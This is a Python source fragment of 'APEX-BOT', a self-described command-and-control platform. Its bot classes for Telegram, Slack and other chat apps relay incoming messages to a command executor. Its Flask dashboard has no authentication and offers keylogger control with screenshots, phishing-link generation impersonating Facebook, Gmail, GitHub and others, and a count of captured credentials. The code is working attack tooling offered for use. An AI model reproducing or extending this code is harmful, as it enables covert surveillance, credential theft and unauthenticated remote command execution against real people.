        return True
    
    def start(self):
        if self.bot:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            asyncio.run(self.bot.start(self.config['token']))
        except Exception as e:
            logger.error(f"Discord bot error: {e}")

# =====================
# TELEGRAM BOT
# =====================
class TelegramBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "telegram_config.json")):
                with open(os.path.join(CONFIG_DIR, "telegram_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'bot_token': '', 'chat_id': '', 'prefix': '/'}
    
    def save_config(self, bot_token: str, chat_id: str = "", enabled: bool = True, prefix: str = '/') -> bool:
        try:
            config = {'enabled': enabled, 'bot_token': bot_token, 'chat_id': chat_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "telegram_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not TELETHON_AVAILABLE:
            return False
        if not self.config.get('bot_token'):
            return False
        return True
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            async def main():
                self.client = TelegramClient('apex_session', 1, 'dummy')
                await self.client.start(bot_token=self.config['bot_token'])
                print(f"{Colors.BLUE}✅ Telegram bot connected{Colors.RESET}")
                
                @self.client.on(events.NewMessage)
                async def handler(event):
                    if event.message.text and event.message.text.startswith(self.config.get('prefix', '/')):
                        cmd = event.message.text[1:].strip()
                        result = self.handler.execute(cmd, 'telegram', str(event.sender_id))
                        output = result.get('output', '')[:4000]
                        await event.reply(f"```{output}```\n_Time: {result.get('execution_time', 0):.2f}s_")
                
                await self.client.run_until_disconnected()
            
            asyncio.run(main())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")

# =====================
# SLACK BOT
# =====================
class SlackBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "slack_config.json")):
                with open(os.path.join(CONFIG_DIR, "slack_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'bot_token': '', 'channel_id': '', 'prefix': '!'}
    
    def save_config(self, bot_token: str, channel_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'bot_token': bot_token, 'channel_id': channel_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "slack_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not SLACK_AVAILABLE:
            return False
        if not self.config.get('bot_token'):
            return False
        self.client = WebClient(token=self.config['bot_token'])
        return True
    
    def start(self):
        if self.client:
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        channel = self.config.get('channel_id', 'general')
        last_ts = {}
        while self.running:
            try:
                response = self.client.conversations_history(channel=channel, limit=5)
                if response['ok'] and response['messages']:
                    for msg in response['messages']:
                        if msg.get('text', '').startswith(self.config.get('prefix', '!')):
                            ts = msg.get('ts')
                            if last_ts.get(channel) != ts:
                                last_ts[channel] = ts
                                cmd = msg['text'][len(self.config.get('prefix', '!')):].strip()
                                result = self.handler.execute(cmd, 'slack', msg.get('user', 'unknown'))
                                self.client.chat_postMessage(
                                    channel=channel,
                                    text=f"```{result.get('output', '')[:2000]}```\n*Time: {result.get('execution_time', 0):.2f}s*"
                                )
                time.sleep(2)
            except Exception as e:
                logger.error(f"Slack monitor error: {e}")
                time.sleep(10)

# =====================
# WHATSAPP BOT
# =====================
class WhatsAppBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.driver = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "whatsapp_config.json")):
                with open(os.path.join(CONFIG_DIR, "whatsapp_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_number': '', 'prefix': '!'}
    
    def save_config(self, phone_number: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_number': phone_number, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "whatsapp_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not SELENIUM_AVAILABLE:
            return False
        if not WEBDRIVER_MANAGER_AVAILABLE:
            return False
        return True
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            options = Options()
            options.add_argument('--headless=new')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--user-data-dir=' + os.path.join(CONFIG_DIR, "whatsapp_session"))
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=options)
            self.driver.get('https://web.whatsapp.com')
            print(f"{Colors.YELLOW}📱 WhatsApp Web opened. Scan QR code to connect.{Colors.RESET}")
            time.sleep(15)
            self.running = True
            while self.running:
                try:
                    time.sleep(5)
                except:
                    pass
        except Exception as e:
            logger.error(f"WhatsApp bot error: {e}")

# =====================
# SIGNAL BOT (via signal-cli)
# =====================
class SignalBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "signal_config.json")):
                with open(os.path.join(CONFIG_DIR, "signal_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_number': '', 'group_id': '', 'prefix': '!'}
    
    def save_config(self, phone_number: str, group_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_number': phone_number, 'group_id': group_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "signal_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return SIGNAL_AVAILABLE
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        while self.running:
            try:
                time.sleep(10)
            except:
                pass

# =====================
# GOOGLE CHAT BOT
# =====================
class GoogleChatBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "google_chat_config.json")):
                with open(os.path.join(CONFIG_DIR, "google_chat_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'webhook_url': '', 'space_id': '', 'prefix': '/'}
    
    def save_config(self, webhook_url: str, space_id: str = "", enabled: bool = True, prefix: str = '/') -> bool:
        try:
            config = {'enabled': enabled, 'webhook_url': webhook_url, 'space_id': space_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "google_chat_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def start(self):
        if self.config.get('enabled') and self.config.get('webhook_url'):
            self.running = True
            print(f"{Colors.ORANGE}✅ Google Chat webhook configured{Colors.RESET}")

# =====================
# IMESSAGE BOT (macOS only)
# =====================
class iMessageBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "imessage_config.json")):
                with open(os.path.join(CONFIG_DIR, "imessage_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_numbers': [], 'prefix': '!'}
    
    def save_config(self, phone_numbers: List[str] = None, enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_numbers': phone_numbers or [], 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "imessage_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return IMESSAGE_AVAILABLE
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        while self.running:
            try:
                time.sleep(10)
            except:
                pass

# =====================
# WEB DASHBOARD (Gradient Theme: Blue, Orange, Purple)
# =====================
class WebDashboard:
    def __init__(self, command_handler, db: DatabaseManager, config: ConfigManager,
                 ip_monitor: IPMonitor, keylogger: AdvancedKeylogger):
        self.handler = command_handler
        self.db = db
        self.config = config
        self.ip_monitor = ip_monitor
        self.keylogger = keylogger
        self.app = None
        self.socketio = None
        self.running = False
    
    def create_app(self):
        if not WEB_AVAILABLE:
            return None
        
        app = Flask(__name__)
        app.config['SECRET_KEY'] = self.config.get('web.secret_key', secrets.token_hex(32))
        CORS(app)
        
        socketio = SocketIO(app, cors_allowed_origins="*")
        
        # Gradient Theme HTML Template
        TEMPLATE = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>🦅 APEX-BOT - Cybersecurity Dashboard</title>
            <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    background: linear-gradient(135deg, #0a0a2e 0%, #1a1a3e 25%, #0f3460 50%, #1a1a3e 75%, #0a0a2e 100%);
                    color: #fff;
                    min-height: 100vh;
                }
                .header {
                    background: linear-gradient(135deg, #1a1a3e 0%, #2d1b69 25%, #ff6b35 50%, #2d1b69 75%, #1a1a3e 100%);
                    padding: 20px;
                    text-align: center;
                    border-bottom: 2px solid #ff6b35;
                    box-shadow: 0 0 30px rgba(255, 107, 53, 0.3);
                }
                .header h1 {
                    font-size: 2.8em;
                    background: linear-gradient(135deg, #4fc3f7, #ff8a65, #ce93d8);
                    -webkit-background-clip: text;
                    -webkit-text-fill-color: transparent;
                    text-shadow: 0 0 30px rgba(79, 195, 247, 0.3);
                    letter-spacing: 4px;
                }
                .header p { color: #aaa; opacity: 0.8; letter-spacing: 2px; }
                .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
                .stats-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
                    gap: 15px;
                    margin-bottom: 30px;
                }
                .stat-card {
                    background: rgba(255,255,255,0.05);
                    backdrop-filter: blur(10px);
                    border: 1px solid rgba(255,255,255,0.1);
                    border-radius: 10px;
                    padding: 20px;
                    text-align: center;
                    transition: all 0.3s;
                }
                .stat-card:hover {
                    border-color: #ff6b35;
                    box-shadow: 0 0 30px rgba(255, 107, 53, 0.2);
                    transform: translateY(-2px);
                }
                .stat-card h3 {
                    font-size: 2em;
                    background: linear-gradient(135deg, #4fc3f7, #ff8a65);
                    -webkit-background-clip: text;
                    -webkit-text-fill-color: transparent;
                }
                .stat-card p { margin-top: 10px; opacity: 0.6; font-size: 0.9em; }
                .section {
                    background: rgba(255,255,255,0.05);
                    backdrop-filter: blur(10px);
                    border: 1px solid rgba(255,255,255,0.1);
                    border-radius: 10px;
                    padding: 20px;
                    margin-bottom: 20px;
                }
                .section h2 {
                    margin-bottom: 15px;
                    border-bottom: 1px solid rgba(255,255,255,0.1);
                    padding-bottom: 10px;
                }
                .section h2 i { color: #ff6b35; margin-right: 10px; }
                table { width: 100%; border-collapse: collapse; }
                th, td { padding: 12px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }
                th { background: rgba(255,255,255,0.05); color: #4fc3f7; }
                .command-input {
                    width: 100%;
                    padding: 15px;
                    background: rgba(0,0,0,0.3);
                    border: 1px solid rgba(255,255,255,0.1);
                    border-radius: 8px;
                    color: #fff;
                    font-size: 16px;
                    margin-bottom: 10px;
                }
                .command-input:focus { outline: none; border-color: #ff6b35; box-shadow: 0 0 20px rgba(255, 107, 53, 0.2); }
                button {
                    background: linear-gradient(135deg, #4fc3f7, #ff6b35);
                    color: white;
                    border: none;
                    padding: 12px 30px;
                    border-radius: 8px;
                    cursor: pointer;
                    font-size: 16px;
                    font-weight: bold;
                    transition: all 0.3s;
                }
                button:hover {
                    transform: scale(1.02);
                    box-shadow: 0 0 30px rgba(255, 107, 53, 0.3);
                }
                .output {
                    background: rgba(0,0,0,0.3);
                    border: 1px solid rgba(255,255,255,0.1);
                    border-radius: 8px;
                    padding: 15px;
                    font-family: monospace;
                    margin-top: 15px;
                    white-space: pre-wrap;
                    max-height: 400px;
                    overflow-y: auto;
                    color: #aaa;
                }
                .status-badge {
                    display: inline-block;
                    padding: 4px 12px;
                    border-radius: 20px;
                    font-size: 12px;
                }
                .status-online { background: rgba(76, 175, 80, 0.3); color: #4caf50; }
                .status-offline { background: rgba(244, 67, 54, 0.3); color: #f44336; }
                .severity-critical { background: rgba(244, 67, 54, 0.3); color: #f44336; }
                .severity-high { background: rgba(255, 152, 0, 0.3); color: #ff9800; }
                .severity-medium { background: rgba(255, 193, 7, 0.3); color: #ffc107; }
                .severity-low { background: rgba(76, 175, 80, 0.3); color: #4caf50; }
                .chart-grid {
                    display: grid;
                    grid-template-columns: 1fr 1fr;
                    gap: 20px;
                    margin-top: 15px;
                }
                .chart-card {
                    background: rgba(0,0,0,0.2);
                    border: 1px solid rgba(255,255,255,0.1);
                    border-radius: 8px;
                    padding: 15px;
                }
                .chart-card h3 { font-size: 0.9rem; opacity: 0.7; margin-bottom: 10px; }
                .chart-container { position: relative; height: 200px; }
                ::-webkit-scrollbar { width: 8px; }
                ::-webkit-scrollbar-track { background: rgba(255,255,255,0.05); }
                ::-webkit-scrollbar-thumb { background: linear-gradient(135deg, #4fc3f7, #ff6b35); border-radius: 4px; }
                .tab-bar {
                    display: flex;
                    gap: 10px;
                    margin-bottom: 20px;
                    flex-wrap: wrap;
                }
                .tab {
                    padding: 10px 20px;
                    background: rgba(255,255,255,0.05);
                    border: 1px solid rgba(255,255,255,0.1);
                    border-radius: 8px;
                    cursor: pointer;
                    transition: all 0.3s;
                }
                .tab:hover, .tab.active {
                    border-color: #ff6b35;
                    background: rgba(255, 107, 53, 0.1);
                }
                .tab-content { display: none; }
                .tab-content.active { display: block; }
                .ip-list {
                    display: flex;
                    flex-wrap: wrap;
                    gap: 10px;
                    max-height: 200px;
                    overflow-y: auto;
                    padding: 10px 0;
                }
                .ip-item {
                    background: rgba(255,255,255,0.05);
                    border: 1px solid rgba(255,255,255,0.1);
                    border-radius: 8px;
                    padding: 8px 16px;
                    display: inline-flex;
                    align-items: center;
                    gap: 10px;
                    font-size: 0.9rem;
                }
                .dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
                .dot.open { background: #4caf50; box-shadow: 0 0 10px rgba(76, 175, 80, 0.5); }
                .dot.closed { background: #f44336; box-shadow: 0 0 10px rgba(244, 67, 54, 0.5); }
                .glow {
                    animation: glow 2s ease-in-out infinite;
                }
                @keyframes glow {
                    0%, 100% { box-shadow: 0 0 5px rgba(255, 107, 53, 0.3); }
                    50% { box-shadow: 0 0 30px rgba(255, 107, 53, 0.5); }
                }
                @media (max-width: 800px) {
                    .chart-grid { grid-template-columns: 1fr; }
                    .header h1 { font-size: 1.8em; }
                    .stats-grid { grid-template-columns: 1fr 1fr; }
                }
                @media (max-width: 500px) {
                    .stats-grid { grid-template-columns: 1fr; }
                }
            </style>
            <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
        </head>
        <body>
            <div class="header glow">
                <h1>🦅 APEX-BOT v5.0.0</h1>
                <p>Ultimate Cybersecurity Command & Control Platform</p>
            </div>
            <div class="container">
                <div class="stats-grid" id="stats">
                    <div class="stat-card"><h3 id="statCommands">0</h3><p>Commands</p></div>
                    <div class="stat-card"><h3 id="statThreats">0</h3><p>Threats</p></div>
                    <div class="stat-card"><h3 id="statBlocked">0</h3><p>Blocked IPs</p></div>
                    <div class="stat-card"><h3 id="statCreds">0</h3><p>Credentials</p></div>
                    <div class="stat-card"><h3 id="statMonitored">0</h3><p>Monitored IPs</p></div>
                    <div class="stat-card"><h3 id="statKeylogs">0</h3><p>Keylogs</p></div>
                </div>

                <div class="tab-bar">
                    <div class="tab active" data-tab="command" onclick="switchTab('command')">🚀 Command Center</div>
                    <div class="tab" data-tab="monitor" onclick="switchTab('monitor')">🛡️ IP Monitor</div>
                    <div class="tab" data-tab="keylogger" onclick="switchTab('keylogger')">⌨️ Keylogger</div>
                    <div class="tab" data-tab="phishing" onclick="switchTab('phishing')">🎣 Phishing</div>
                    <div class="tab" data-tab="threats" onclick="switchTab('threats')">🚨 Threats</div>
                </div>

                <div id="tab-command" class="tab-content active">
                    <div class="section">
                        <h2><i class="fas fa-terminal"></i> Command Center</h2>
                        <div style="display:flex; gap:10px; flex-wrap:wrap;">
                            <input type="text" id="command" class="command-input" placeholder="Enter command..." style="flex:1; min-width:200px;" onkeypress="if(event.keyCode==13) executeCommand()">
                            <button onclick="executeCommand()"><i class="fas fa-play"></i> Execute</button>
                            <button onclick="clearOutput()" style="background:rgba(255,255,255,0.1);"><i class="fas fa-eraser"></i> Clear</button>
                        </div>
                        <div id="command-output" class="output">
                            <span style="color:#4fc3f7;">system></span> Ready for commands...
                            <span style="display:inline-block;width:10px;height:20px;background:#4fc3f7;animation:blink 1s infinite;"></span>
                        </div>
                    </div>
                </div>

                <div id="tab-monitor" class="tab-content">
                    <div class="section">
                        <h2><i class="fas fa-shield-alt"></i> IP Monitor</h2>
                        <div style="display:flex; gap:10px; flex-wrap:wrap; margin-bottom:15px;">
                            <button onclick="scanAllIPs()"><i class="fas fa-sync-alt"></i> Scan All IPs</button>
                            <button onclick="showAllMonitoredIPs()"><i class="fas fa-list"></i> Show All Monitored IPs</button>
                        </div>
                        <div id="ip-list" class="ip-list">
                            <span style="color:#aaa;">No IPs monitored yet...</span>
                        </div>
                    </div>
                    <div class="chart-grid">
                        <div class="chart-card">
                            <h3><i class="fas fa-chart-bar"></i> Open Ports Distribution</h3>
                            <div class="chart-container"><canvas id="portsChart"></canvas></div>
                        </div>
                        <div class="chart-card">
                            <h3><i class="fas fa-chart-pie"></i> Threat Level Distribution</h3>
                            <div class="chart-container"><canvas id="threatChart"></canvas></div>
                        </div>
                    </div>
                </div>

                <div id="tab-keylogger" class="tab-content">
                    <div class="section">
                        <h2><i class="fas fa-keyboard"></i> Keylogger</h2>
                        <div style="display:flex; gap:10px; flex-wrap:wrap; margin-bottom:15px;">
                            <button onclick="startKeylogger()"><i class="fas fa-play"></i> Start</button>
                            <button onclick="stopKeylogger()"><i class="fas fa-stop"></i> Stop</button>
                            <button onclick="showKeylogs()"><i class="fas fa-eye"></i> Show Logs</button>
                            <button onclick="showScreenshots()"><i class="fas fa-camera"></i> Screenshots</button>
                        </div>
                        <div id="keylogger-output" class="output">
                            <span style="color:#4fc3f7;">keylogger></span> Press F10 to start/stop keylogger
                        </div>
                    </div>
                </div>

                <div id="tab-phishing" class="tab-content">
                    <div class="section">
                        <h2><i class="fas fa-fish"></i> Phishing</h2>
                        <div style="display:flex; gap:10px; flex-wrap:wrap; margin-bottom:15px;">
                            <button onclick="generatePhishing('facebook')">Facebook</button>
                            <button onclick="generatePhishing('instagram')">Instagram</button>
                            <button onclick="generatePhishing('twitter')">Twitter</button>
                            <button onclick="generatePhishing('gmail')">Gmail</button>
                            <button onclick="generatePhishing('linkedin')">LinkedIn</button>
                            <button onclick="generatePhishing('github')">GitHub</button>
                            <button onclick="generatePhishing('custom')">Custom</button>
                        </div>
                        <div id="phishing-output" class="output">
                            <span style="color:#4fc3f7;">phishing></span> Generate a phishing link
                        </div>
                    </div>
                </div>

                <div id="tab-threats" class="tab-content">
                    <div class="section">
                        <h2><i class="fas fa-exclamation-triangle"></i> Threats</h2>
                        <div id="threats-table-container">
                            <table>
                                <thead><tr><th>Time</th><th>Type</th><th>Source IP</th><th>Severity</th></tr></thead>
                                <tbody id="threats-table"></tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
            <script>
                var socket = io();
                let portsChart, threatChart;

                function switchTab(tabName) {
                    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
                    document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
                    document.getElementById('tab-' + tabName).classList.add('active');
                    document.querySelector('[data-tab="' + tabName + '"]').classList.add('active');
                }

                function executeCommand() {
                    var command = document.getElementById('command').value;
                    if (command) {
                        fetch('/api/command', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ command: command })
                        })
                        .then(response => response.json())
                        .then(data => {
                            var outputDiv = document.getElementById('command-output');
                            if (data.success) {
                                outputDiv.innerHTML = '<span style="color:#4fc3f7;">$></span> ' + command + '<br><span style="color:#4fc3f7;">output></span><br>' + data.output + '<br><span style="color:#4fc3f7;">time></span> ' + data.execution_time + 's';
                            } else {
                                outputDiv.innerHTML = '<span style="color:#f44336;">error></span> ' + data.error;
                            }
                        });
                    }
                }

                function clearOutput() {
                    document.getElementById('command-output').innerHTML = '<span style="color:#4fc3f7;">system></span> Cleared';
                }

                function loadStats() {
                    fetch('/api/stats')
                        .then(response => response.json())
                        .then(data => {
                            document.getElementById('statCommands').textContent = data.total_commands || 0;
                            document.getElementById('statThreats').textContent = data.total_threats || 0;
                            document.getElementById('statBlocked').textContent = data.blocked_ips || 0;
                            document.getElementById('statCreds').textContent = data.captured_credentials || 0;
                            document.getElementById('statMonitored').textContent = data.total_managed_ips || 0;
                            document.getElementById('statKeylogs').textContent = data.total_keylogs || 0;
                        });
                }

                function loadThreats() {
                    fetch('/api/threats')
                        .then(response => response.json())
                        .then(data => {
                            var html = '';
                            data.threats.forEach(function(threat) {
                                var severityClass = 'severity-' + threat.severity;
                                html += '<tr><td>' + threat.timestamp.slice(0,19) + '</td><td>' + threat.threat_type + '</td><td>' + threat.source_ip + '</td><td><span class="status-badge ' + severityClass + '">' + threat.severity.toUpperCase() + '</span></td></tr>';
                            });
                            document.getElementById('threats-table').innerHTML = html;
                        });
                }

                function loadMonitoredIPs() {
                    fetch('/api/ips')
                        .then(response => response.json())
                        .then(data => {
                            var container = document.getElementById('ip-list');
                            if (data.ips && data.ips.length > 0) {
                                var html = '';
                                data.ips.slice(0, 20).forEach(function(ip) {
                                    var status = ip.is_blocked ? 'closed' : 'open';
                                    html += '<div class="ip-item"><span class="dot ' + status + '"></span> ' + ip.ip_address + ' <span style="font-size:0.8rem;color:#aaa;">' + (ip.open_ports ? ip.open_ports.length : 0) + ' ports</span></div>';
                                });
                                container.innerHTML = html;
                            } else {
                                container.innerHTML = '<span style="color:#aaa;">No IPs monitored yet...</span>';
                            }
                        });
                }

                function scanAllIPs() {
                    fetch('/api/scan_all', { method: 'POST' })
                        .then(response => response.json())
                        .then(data => {
                            alert('Scan started: ' + data.message);
                            loadMonitoredIPs();
                        });
                }

                function showAllMonitoredIPs() {
                    loadMonitoredIPs();
                }

                function startKeylogger() {
                    fetch('/api/keylogger/start', { method: 'POST' })
                        .then(response => response.json())
                        .then(data => {
                            document.getElementById('keylogger-output').innerHTML = '<span style="color:#4fc3f7;">keylogger></span> ' + data.message;
                        });
                }

                function stopKeylogger() {
                    fetch('/api/keylogger/stop', { method: 'POST' })
                        .then(response => response.json())
                        .then(data => {
                            document.getElementById('keylogger-output').innerHTML = '<span style="color:#4fc3f7;">keylogger></span> ' + data.message;
                        });
                }

                function showKeylogs() {
                    fetch('/api/keylogger/logs')
                        .then(response => response.json())
                        .then(data => {
                            var output = '<span style="color:#4fc3f7;">keylogs></span> ' + data.count + ' entries\n';
                            if (data.logs && data.logs.length > 0) {
                                data.logs.slice(0, 10).forEach(function(log) {
                                    output += '[' + log.timestamp.slice(0,19) + '] ' + log.text + '\n';
                                });
                                if (data.logs.length > 10) {
                                    output += '... and ' + (data.logs.length - 10) + ' more';
                                }
                            }
                            document.getElementById('keylogger-output').innerHTML = output;
                        });
                }

                function showScreenshots() {
                    fetch('/api/keylogger/screenshots')
                        .then(response => response.json())
                        .then(data => {
                            var output = '<span style="color:#4fc3f7;">screenshots></span> ' + data.count + ' screenshots\n';
                            data.screenshots.forEach(function(s) {
                                output += '📸 ' + s + '\n';
                            });
                            document.getElementById('keylogger-output').innerHTML = output;
                        });
                }

                function generatePhishing(platform) {
                    fetch('/api/phishing/generate', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ platform: platform })
                    })
                    .then(response => response.json())
                    .then(data => {
                        var output = '<span style="color:#4fc3f7;">phishing></span> Link generated for ' + platform + '\n';
                        output += 'ID: ' + data.link_id + '\n';
                        output += 'URL: ' + data.phishing_url + '\n';
                        document.getElementById('phishing-output').innerHTML = output;
                    });
                }

                function initCharts() {
                    var ctxPorts = document.getElementById('portsChart').getContext('2d');
                    var ctxThreat = document.getElementById('threatChart').getContext('2d');

                    portsChart = new Chart(ctxPorts, {
                        type: 'bar',
                        data: {
                            labels: ['Open Ports', 'Closed Ports'],
                            datasets: [{
                                label: 'Ports',
                                data: [0, 0],
                                backgroundColor: ['#4fc3f7', '#ff6b35'],
                                borderColor: ['#4fc3f7', '#ff6b35'],
                                borderWidth: 1,
                                borderRadius: 4
                            }]
                        },
                        options: {
                            responsive: true,
                            maintainAspectRatio: false,
                            plugins: { legend: { display: false } },
                            scales: {
                                y: { beginAtZero: true, grid: { color: 'rgba(255,255,255,0.05)' }, ticks: { color: '#aaa' } },
                                x: { grid: { display: false }, ticks: { color: '#aaa' } }
                            }
                        }
                    });

                    threatChart = new Chart(ctxThreat, {
                        type: 'pie',
                        data: {
                            labels: ['Critical', 'High', 'Medium', 'Low'],
                            datasets: [{
                                data: [0, 0, 0, 0],
                                backgroundColor: ['#f44336', '#ff9800', '#ffc107', '#4caf50'],
                                borderColor: 'rgba(0,0,0,0.5)',
                                borderWidth: 2
                            }]
                        },
                        options: {
                            responsive: true,
                            maintainAspectRatio: false,
                            plugins: {
                                legend: { position: 'bottom', labels: { color: '#aaa', usePointStyle: true } }
                            },
                            cutout: '55%'
                        }
                    });
                }

                function updateCharts(openPorts, closedPorts, threats) {
                    if (portsChart) {
                        portsChart.data.datasets[0].data = [openPorts, closedPorts];
                        portsChart.update();
                    }
                    if (threatChart && threats) {
                        threatChart.data.datasets[0].data = [
                            threats.critical || 0,
                            threats.high || 0,
                            threats.medium || 0,
                            threats.low || 0
                        ];
                        threatChart.update();
                    }
                }

                document.addEventListener('DOMContentLoaded', function() {
                    initCharts();
                    loadStats();
                    loadThreats();
                    loadMonitoredIPs();
                    setInterval(loadStats, 10000);
                    setInterval(loadThreats, 10000);
                    setInterval(loadMonitoredIPs, 10000);
                });
            </script>
        </body>
        </html>
        '''
        
        @app.route('/')
        def index():
            return render_template_string(TEMPLATE)
        
        @app.route('/api/command', methods=['POST'])
        def api_command():
            data = request.json
            command = data.get('command', '')
            result = self.handler.execute(command, 'web', 'web_user')
            socketio.emit('command_result', {
                'command': command,
                'output': result.get('output', '')[:2000],
                'execution_time': result.get('execution_time', 0)
            })
            return jsonify(result)
        
        @app.route('/api/stats')
        def api_stats():
            stats = self.db.get_statistics()
            return jsonify(stats)
        
        @app.route('/api/threats')
        def api_threats():
            threats = self.db.get_recent_threats(20)
            return jsonify({'threats': threats})
        
        @app.route('/api/ips')
        def api_ips():
            ips = self.db.get_managed_ips()
            ip_list = []
            for ip in ips:
                ip_list.append({
                    'ip_address': ip['ip_address'],
                    'is_blocked': ip['is_blocked'],
                    'open_ports': json.loads(ip.get('open_ports', '[]')),
                    'threat_level': ip.get('threat_level', 'low')
                })
            return jsonify({'ips': ip_list})
        
        @app.route('/api/scan_all', methods=['POST'])
        def api_scan_all():
            ips = self.db.get_managed_ips()
            for ip_data in ips:
                self.ip_monitor.scan_ip_now(ip_data['ip_address'])
            return jsonify({'success': True, 'message': f'Scanning {len(ips)} IPs'})
        
        @app.route('/api/keylogger/start', methods=['POST'])
        def api_keylogger_start():
            if self.keylogger.start_keylogger():
                return jsonify({'success': True, 'message': 'Keylogger started (F10 to stop)'})
            return jsonify({'success': False, 'message': 'Failed to start keylogger'})
        
        @app.route('/api/keylogger/stop', methods=['POST'])
        def api_keylogger_stop():
            self.keylogger.stop_keylogger()
            return jsonify({'success': True, 'message': 'Keylogger stopped'})
        
        @app.route('/api/keylogger/logs')
        def api_keylogger_logs():
            logs = self.keylogger.get_keylogs(50)
            return jsonify({'logs': logs, 'count': len(logs)})
        
        @app.route('/api/keylogger/screenshots')
        def api_keylogger_screenshots():
            screenshots = self.keylogger.get_screenshots()
            return jsonify({'screenshots': screenshots, 'count': len(screenshots)})
        
        @app.route('/api/phishing/generate', methods=['POST'])
        def api_phishing_generate():
            data = request.json
            platform = data.get('platform', 'custom')
            social = SocialEngineeringTools(self.db)
            result = social.generate_phishing_link(platform)
            return jsonify(result)
        
        self.app = app
        self.socketio = socketio
        return app
    
    def start(self):
        if not WEB_AVAILABLE:
            print(f"{Colors.YELLOW}⚠️ Flask not available. Web dashboard disabled.{Colors.RESET}")
            return
        
        app = self.create_app()
        if app:
            port = self.config.get('web.port', 5000)
            host = self.config.get('web.host', '0.0.0.0')
            thread = threading.Thread(target=lambda: self.socketio.run(app, host=host, port=port, debug=False), daemon=True)
            thread.start()
